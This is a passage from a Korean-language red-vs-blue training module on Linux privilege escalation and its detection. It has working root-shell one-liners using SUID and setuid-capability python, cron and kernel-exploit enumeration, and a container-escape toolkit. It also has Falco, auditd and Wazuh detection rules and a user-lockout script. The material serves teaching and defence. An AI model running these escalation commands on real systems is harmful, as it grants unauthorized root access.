/usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# === Phase 5: Capabilities ===
getcap -r / 2>/dev/null
# 발견: /usr/bin/python3.10 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# === Phase 6: Writable PATH/file ===
find / -writable -type f 2>/dev/null | head -20
# /etc/cron.d/* 가 writable 면 → 자체 cron 추가

# === Phase 7: 커널 exploit ===
~/les/linux-exploit-suggester.sh --uname --gcc

# 출력 예:
# [+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
# [+] Exposure: highly probable
# [+] Tags: ubuntu=22.04, kernel=5.15
# [+] Download URL: https://www.exploit-db.com/exploits/50979

# === Phase 8: Container escape (있으면) ===
[ -f /.dockerenv ] && echo "In container" 
mount | grep -E "docker|cgroup"

# CDK toolkit
git clone https://github.com/cdk-team/CDK ~/cdk
~/cdk/bin/cdk evaluate
```

### Blue — privesc 탐지 (Falco)

```bash
# === Falco 룰 (privesc 자동 탐지) ===
sudo tee /etc/falco/falco_rules.local.yaml << 'EOF'
- rule: Privilege Escalation via Sudo
  desc: Detect sudo to root with shell
  condition: >
    spawned_process and 
    proc.name = sudo and 
    (proc.cmdline contains "/bin/sh" or 
     proc.cmdline contains "/bin/bash" or
     proc.cmdline contains "find" or 
     proc.cmdline contains "vim")
  output: "Privesc via sudo (user=%user.name cmd=%proc.cmdline)"
  priority: WARNING

- rule: SUID Binary Execution
  desc: Suspicious SUID binary
  condition: >
    spawned_process and 
    proc.is_suid_root = true and
    proc.name in (find, vim, less, more, awk, perl, python3)
  output: "SUID privesc attempt (user=%user.name binary=%proc.name)"
  priority: CRITICAL

- rule: Capabilities-based Privesc
  desc: cap_setuid 또는 cap_sys_admin
  condition: >
    spawned_process and 
    proc.name in (python3, perl, ruby) and
    (proc.cmdline contains "setuid(0)" or 
     proc.cmdline contains "execl")
  output: "Capability privesc (user=%user.name cmd=%proc.cmdline)"
  priority: CRITICAL

- rule: Writable Cron 자체 추가
  desc: Cron 파일 변경
  condition: >
    open_write and 
    (fd.name startswith "/etc/cron.d" or
     fd.name startswith "/var/spool/cron/crontabs")
  output: "Cron file modified (user=%user.name file=%fd.name)"
  priority: ERROR
EOF

sudo systemctl restart falco

# === auditd 룰 ===
sudo tee /etc/audit/rules.d/privesc.rules << 'EOF'
# 권한 변경
-a always,exit -F arch=b64 -S setuid -S setgid -S setreuid -S setregid -k privesc

# Sudo 실행
-w /etc/sudoers -p wa -k actions
-a always,exit -F arch=b64 -S execve -F euid=0 -F auid>=1000 -F auid!=4294967295 -k sudo_exec

# SUID/SGID 변경
-a always,exit -F arch=b64 -S chmod -S fchmod -S fchmodat -k perm_change
EOF

sudo augenrules --load
sudo systemctl restart auditd

# 검색
sudo ausearch -k privesc -i | head
sudo ausearch -k sudo_exec --start today | head

# === Wazuh user-behavior + ATT&CK 매핑 ===
sudo tee -a /var/ossec/etc/rules/local_rules.xml << 'EOF'
<rule id="100500" level="13">
  <if_matched_sid>5710</if_matched_sid>
  <match>sudo .* /bin/sh</match>
  <description>Privesc via sudo to shell</description>
  <mitre><id>T1548.003</id></mitre>
</rule>
EOF
```

### 자동 대응 (Falco → Wazuh AR → 격리)

```bash
# Falco webhook → Wazuh
# /etc/falco/falco.yaml
# program_output:
#   enabled: true
#   program: "curl -X POST http://wazuh:9200/_doc -d @-"

# Wazuh AR — privesc 탐지 시 사용자 차단
sudo tee /var/ossec/active-response/bin/lock-user.sh << 'EOF'
#!/bin/bash
USER=$5
sudo passwd -l $USER                                  # 잠금
sudo pkill -KILL -u $USER                             # 모든 process 종료
EOF
sudo chmod +x /var/ossec/active-response/bin/lock-user.sh

# /var/ossec/etc/ossec.conf
# <command><name>lock-user</name><executable>lock-user.sh</executable></command>
# <active-response><command>lock-user</command><location>local</location><level>13</level></active-response>
```

### Privesc 결과 (Red vs Blue 점수)

| Red 성공 | 점수 | Blue 탐지 | 점수 |
|---------|------|----------|------|
| LinPEAS 자동 발견 | +5 | Falco 알림 | +10 |
| Cron 침투 (pspy) | +15 | auditd 변경 감지 | +10 |
| Sudo + GTFOBins | +10 | Wazuh ATT&CK | +10 |
| SUID exploit | +15 | Falco SUID rule | +10 |
| Capability 악용 | +10 | Falco capability | +5 |
| 커널 exploit | +20 | (탐지 어려움) | - |
| Container escape | +25 | Falco container | +15 |
| 흔적 은닉 | +10 | aide FIM | +10 |

학생은 본 5주차에서 **Red (LinPEAS + pspy + GTFOBins + linux-exploit-suggester) ↔ Blue (Falco + auditd + Wazuh user-behavior)** 의 privesc 공방을 OSS 도구로 익힌다.
